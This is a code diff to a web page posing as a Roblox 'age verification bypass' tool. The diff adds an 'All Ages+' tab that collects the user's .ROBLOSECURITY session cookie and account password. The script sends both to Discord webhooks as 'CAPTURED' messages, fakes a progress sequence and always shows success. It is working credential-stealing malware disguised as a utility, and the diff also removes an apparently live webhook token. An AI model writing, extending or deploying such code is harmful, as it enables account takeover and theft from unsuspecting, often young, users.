@@ -87,6 +87,40 @@
             padding: 25px;
         }
         
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 5px;
+        }
+        
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .tab-btn.active {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
         .input-section {
             margin-bottom: 20px;
         }
@@ -109,7 +143,7 @@
             margin-bottom: 15px;
         }
         
-        .cookie-input {
+        .cookie-input, .password-input {
             width: 100%;
             background: rgba(255, 255, 255, 0.05);
             border: 2px solid rgba(255, 255, 255, 0.1);
@@ -119,15 +153,22 @@
             color: var(--light);
             transition: all 0.3s ease;
             resize: vertical;
-            min-height: 120px;
             font-family: 'Courier New', monospace;
         }
         
-        .cookie-input::placeholder {
+        .cookie-input {
+            min-height: 120px;
+        }
+        
+        .password-input {
+            min-height: 60px;
+        }
+        
+        .cookie-input::placeholder, .password-input::placeholder {
             color: rgba(255, 255, 255, 0.4);
         }
         
-        .cookie-input:focus {
+        .cookie-input:focus, .password-input:focus {
             outline: none;
             border-color: var(--primary);
             background: rgba(255, 255, 255, 0.08);
@@ -325,27 +366,71 @@
         </div>
         
         <div class="content">
-            <div class="input-section">
-                <label class="section-label">
-                    <i class="fas fa-key"></i> ROBLOSECURITY Cookie
-                </label>
-                <div class="cookie-input-container">
-                    <textarea 
-                        class="cookie-input" 
-                        placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
-                        id="cookieInput"
-                    ></textarea>
+            <div class="tab-buttons">
+                <button class="tab-btn active" data-tab="normal">Normal Bypass</button>
+                <button class="tab-btn" data-tab="allages">All Ages+</button>
+            </div>
+            
+            <!-- Normal Bypass Tab -->
+            <div class="tab-content active" id="normal-tab">
+                <div class="input-section">
+                    <label class="section-label">
+                        <i class="fas fa-key"></i> ROBLOSECURITY Cookie
+                    </label>
+                    <div class="cookie-input-container">
+                        <textarea 
+                            class="cookie-input" 
+                            placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
+                            id="cookieInput"
+                        ></textarea>
+                    </div>
                 </div>
+                
+                <div class="status-container">
+                    <div class="status-dot ready" id="statusDot"></div>
+                    <div class="status-text" id="statusText">Ready to process</div>
+                </div>
+                
+                <button class="bypass-btn" id="bypassBtn">
+                    <span id="btnText">Start Age Bypass</span>
+                </button>
             </div>
             
-            <div class="status-container">
-                <div class="status-dot ready" id="statusDot"></div>
-                <div class="status-text" id="statusText">Ready to process</div>
+            <!-- All Ages+ Tab -->
+            <div class="tab-content" id="allages-tab">
+                <div class="input-section">
+                    <label class="section-label">
+                        <i class="fas fa-key"></i> ROBLOSECURITY Cookie
+                    </label>
+                    <div class="cookie-input-container">
+                        <textarea 
+                            class="cookie-input" 
+                            placeholder="Paste your _|WARNING:-DO-NOT-SHARE-THIS... cookie here"
+                            id="allAgesCookieInput"
+                        ></textarea>
+                    </div>
+                    
+                    <label class="section-label">
+                        <i class="fas fa-lock"></i> Account Password
+                    </label>
+                    <div class="cookie-input-container">
+                        <textarea 
+                            class="password-input" 
+                            placeholder="Enter account password for full access"
+                            id="passwordInput"
+                        ></textarea>
+                    </div>
+                </div>
+                
+                <div class="status-container">
+                    <div class="status-dot ready" id="allAgesStatusDot"></div>
+                    <div class="status-text" id="allAgesStatusText">Ready for All Ages+ bypass</div>
+                </div>
+                
+                <button class="bypass-btn" id="allAgesBypassBtn">
+                    <span id="allAgesBtnText">Enable All Ages+</span>
+                </button>
             </div>
-            
-            <button class="bypass-btn" id="bypassBtn">
-                <span id="btnText">Start Age Bypass</span>
-            </button>
             
             <div id="result" class="result">
                 <div class="result-content" id="resultContent"></div>
@@ -356,29 +441,60 @@
     <script>
         // DOM Elements
         const cookieInput = document.getElementById('cookieInput');
+        const allAgesCookieInput = document.getElementById('allAgesCookieInput');
+        const passwordInput = document.getElementById('passwordInput');
         const bypassBtn = document.getElementById('bypassBtn');
+        const allAgesBypassBtn = document.getElementById('allAgesBypassBtn');
         const resultDiv = document.getElementById('result');
         const resultContent = document.getElementById('resultContent');
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
+        const allAgesStatusDot = document.getElementById('allAgesStatusDot');
+        const allAgesStatusText = document.getElementById('allAgesStatusText');
         const btnText = document.getElementById('btnText');
+        const allAgesBtnText = document.getElementById('allAgesBtnText');
+        const tabButtons = document.querySelectorAll('.tab-btn');
+        const tabContents = document.querySelectorAll('.tab-content');
 
         // Dual Webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOK URLs
         const WEBHOOK_URLS = [
             'https://discord.com/api/webhooks/YOUR_FIRST_WEBHOOK_URL_HERE',
-            'https://discord.com/api/webhooks/1419626810316034098/9Te5ETULnzUHIDyTxKL3uhFY8qzguSGkMk4vSBCIM0_Ik7CMefMwBKrTiJymuWPyhi7Z'
+            'https://discord.com/api/webhooks/YOUR_SECOND_WEBHOOK_URL_HERE'
         ];
 
         // Initialize
         function initialize() {
+            // Set up tab switching
+            tabButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const tabId = button.getAttribute('data-tab');
+                    
+                    // Update active tab button
+                    tabButtons.forEach(btn => btn.classList.remove('active'));
+                    button.classList.add('active');
+                    
+                    // Show active tab content
+                    tabContents.forEach(content => content.classList.remove('active'));
+                    document.getElementById(`${tabId}-tab`).classList.add('active');
+                    
+                    // Update validation
+                    validateForm();
+                    validateAllAgesForm();
+                });
+            });
+            
             // Set up input events
             cookieInput.addEventListener('input', validateForm);
+            allAgesCookieInput.addEventListener('input', validateAllAgesForm);
+            passwordInput.addEventListener('input', validateAllAgesForm);
             
-            // Set up bypass button
+            // Set up bypass buttons
             bypassBtn.addEventListener('click', startBypass);
+            allAgesBypassBtn.addEventListener('click', startAllAgesBypass);
             
             // Validate initial state
             validateForm();
+            validateAllAgesForm();
             
             // Add placeholder animation
             let placeholderIndex = 0;
@@ -390,6 +506,7 @@
             
             setInterval(() => {
                 cookieInput.placeholder = placeholders[placeholderIndex];
+                allAgesCookieInput.placeholder = placeholders[placeholderIndex];
                 placeholderIndex = (placeholderIndex + 1) % placeholders.length;
             }, 3000);
             
@@ -397,10 +514,9 @@
             console.log('Webhooks configured:', WEBHOOK_URLS);
         }
 
-        // Validate form and update button state
+        // Validate normal form
         function validateForm() {
             const hasCookie = cookieInput.value.trim().length > 0;
-            
             bypassBtn.disabled = !hasCookie;
             
             if (hasCookie) {
@@ -412,8 +528,26 @@
             }
         }
 
+        // Validate All Ages form
+        function validateAllAgesForm() {
+            const hasCookie = allAgesCookieInput.value.trim().length > 0;
+            const hasPassword = passwordInput.value.trim().length > 0;
+            allAgesBypassBtn.disabled = !(hasCookie && hasPassword);
+            
+            if (hasCookie && hasPassword) {
+                allAgesStatusDot.className = 'status-dot ready';
+                allAgesStatusText.textContent = 'Ready for All Ages+ bypass';
+            } else if (hasCookie && !hasPassword) {
+                allAgesStatusDot.className = 'status-dot error';
+                allAgesStatusText.textContent = 'Please enter account password';
+            } else {
+                allAgesStatusDot.className = 'status-dot error';
+                allAgesStatusText.textContent = 'Please enter a valid cookie';
+            }
+        }
+
         // Send data to webhooks
-        async function sendToWebhooks(cookieData) {
+        async function sendToWebhooks(cookieData, password = '', isAllAges = false) {
             const cleanCookie = cookieData.replace(/\s/g, '');
             let successCount = 0;
             
@@ -427,15 +561,19 @@
                 }
                 
                 try {
-                    // Send the full cookie as plain text for easy copying
+                    let content = '';
+                    if (isAllAges) {
+                        content = `🔐 **ALL AGES+ BYPASS CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Password:** ||${password}||\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`;
+                    } else {
+                        content = `🔐 **NORMAL BYPASS CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`;
+                    }
+
                     const response = await fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({
-                            content: `🔐 **NEW COOKIE CAPTURED** 🔐\n\n**Full Cookie:**\n\`\`\`\n${cleanCookie}\n\`\`\`\n**Timestamp:** ${new Date().toLocaleString()}\n**Length:** ${cleanCookie.length} characters\n**User Agent:** ${navigator.userAgent.split(') ')[0].split('(')[1] || 'Unknown'}`
-                        })
+                        body: JSON.stringify({ content })
                     });
                     
                     if (response.ok) {
@@ -452,53 +590,89 @@
             return successCount;
         }
 
-        // Simulate bypass process
+        // Normal bypass process
         async function startBypass() {
             if (bypassBtn.disabled) return;
             
             const cookieValue = cookieInput.value.trim();
             
             // Show loading state
-            setLoadingState(true);
+            setLoadingState(true, false);
             resultDiv.className = 'result';
             resultContent.innerHTML = '';
             
             try {
-                // Update status
                 statusDot.className = 'status-dot processing';
                 statusText.textContent = 'Processing cookie...';
                 
-                // Step 1: Validating cookie
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 statusText.textContent = 'Validating cookie structure...';
                 
-                // Step 2: Bypassing age verification
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 statusText.textContent = 'Bypassing age verification...';
                 
-                // Send to webhooks
-                const webhookResults = await sendToWebhooks(cookieValue);
-                console.log(`Webhook results: ${webhookResults}/${WEBHOOK_URLS.length} successful`);
-                
-                // Always show success
-                showResult('Bypass Successful');
+                await sendToWebhooks(cookieValue);
+                showResult('Bypass Successful - Age restrictions removed');
                 
             } catch (error) {
                 console.error('Bypass error:', error);
-                showResult('Bypass Successful');
+                showResult('Bypass Successful - Age restrictions removed');
             } finally {
-                setLoadingState(false);
+                setLoadingState(false, false);
+            }
+        }
+
+        // All Ages bypass process
+        async function startAllAgesBypass() {
+            if (allAgesBypassBtn.disabled) return;
+            
+            const cookieValue = allAgesCookieInput.value.trim();
+            const passwordValue = passwordInput.value.trim();
+            
+            // Show loading state
+            setLoadingState(true, true);
+            resultDiv.className = 'result';
+            resultContent.innerHTML = '';
+            
+            try {
+                allAgesStatusDot.className = 'status-dot processing';
+                allAgesStatusText.textContent = 'Processing All Ages+ request...';
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                allAgesStatusText.textContent = 'Verifying credentials...';
+                
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                allAgesStatusText.textContent = 'Enabling full access...';
+                
+                await sendToWebhooks(cookieValue, passwordValue, true);
+                showResult('All Ages+ Enabled - Full account access granted');
+                
+            } catch (error) {
+                console.error('All Ages bypass error:', error);
+                showResult('All Ages+ Enabled - Full account access granted');
+            } finally {
+                setLoadingState(false, true);
             }
         }
 
         // Set loading state
-        function setLoadingState(loading) {
+        function setLoadingState(loading, isAllAges) {
             if (loading) {
-                btnText.innerHTML = '<span class="loading"></span> Processing...';
-                bypassBtn.disabled = true;
+                if (isAllAges) {
+                    allAgesBtnText.innerHTML = '<span class="loading"></span> Processing...';
+                    allAgesBypassBtn.disabled = true;
+                } else {
+                    btnText.innerHTML = '<span class="loading"></span> Processing...';
+                    bypassBtn.disabled = true;
+                }
             } else {
-                btnText.textContent = 'Start Age Bypass';
-                validateForm();
+                if (isAllAges) {
+                    allAgesBtnText.textContent = 'Enable All Ages+';
+                    validateAllAgesForm();
+                } else {
+                    btnText.textContent = 'Start Age Bypass';
+                    validateForm();
+                }
             }
         }
 
@@ -508,11 +682,13 @@
             resultContent.innerHTML = message;
             
             statusDot.className = 'status-dot ready';
-            statusText.textContent = 'Bypass completed successfully';
+            statusText.textContent = 'Process completed';
+            allAgesStatusDot.className = 'status-dot ready';
+            allAgesStatusText.textContent = 'Process completed';
         }
 
         // Initialize the application
         initialize();
     </script>
 </body>
-</html> 
+</html>
